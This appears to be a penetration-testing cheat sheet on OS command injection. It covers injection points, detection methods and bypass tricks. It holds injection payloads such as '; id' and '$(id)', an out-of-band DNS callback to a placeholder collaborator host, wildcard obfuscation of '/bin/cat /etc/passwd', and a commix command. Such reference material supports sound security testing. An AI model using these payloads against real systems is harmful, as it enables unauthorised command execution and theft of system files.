# Command Injection Payloads

## Overview
Command injection occurs when user-controlled input is passed to a system shell command without proper sanitization, allowing execution of arbitrary OS commands.

## Methodology

### 1. Identify Injection Points
- Parameters passed to system commands: file operations, PDF generation, email sending, ping/traceroute tools, image processing
- Look for functionality that interacts with the OS

### 2. Detection Approach
- **Inline**: Test metacharacters `;`, `|`, `||`, `&&`, `&`, `` ` ``, `$()` followed by a command
- **Blind (time-based)**: Inject `; sleep 5` and measure response delay
- **Blind (OOB)**: Inject `; nslookup COLLABORATOR` for DNS callback

### 3. Metacharacter Reference

| Metachar | Behavior | Example |
|----------|----------|---------|
| `;` | Command separator | `; id` |
| `\|` | Pipe output | `\| id` |
| `\|\|` | OR — runs if first fails | `\|\| id` |
| `&&` | AND — runs if first succeeds | `&& id` |
| `` ` `` | Backtick substitution | `` `id` `` |
| `$()` | Command substitution | `$(id)` |
| `%0a` | Newline injection | `%0aid` |

### 4. Bypass Techniques
- **Space bypass**: `${IFS}`, `{cmd,arg}`, `<`, tab (`%09`)
- **Quote insertion**: `w'h'o'am'i` (breaks keyword detection)
- **Wildcard bypass**: `/???/??t /???/p??s??` for `/bin/cat /etc/passwd`
- **Variable substitution**: `$@`, `$()` to split command keywords

## Payload Reference

> Full curated payload lists: [PayloadAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

Key sections:
- [Basic commands](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#exploits)
- [Filter bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#bypass-without-space)
- [Time-based detection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#time-based-data-exfiltration)

For local curated payloads, see `local-payloads/cmdi.md`.

## Context Notes
- **After manual confirmation**, delegate to `commix`: `commix --url="<url>" --batch`
- **Windows vs Linux**: Windows uses `&`, `|`; use `ping -n 5 127.0.0.1` instead of `sleep`
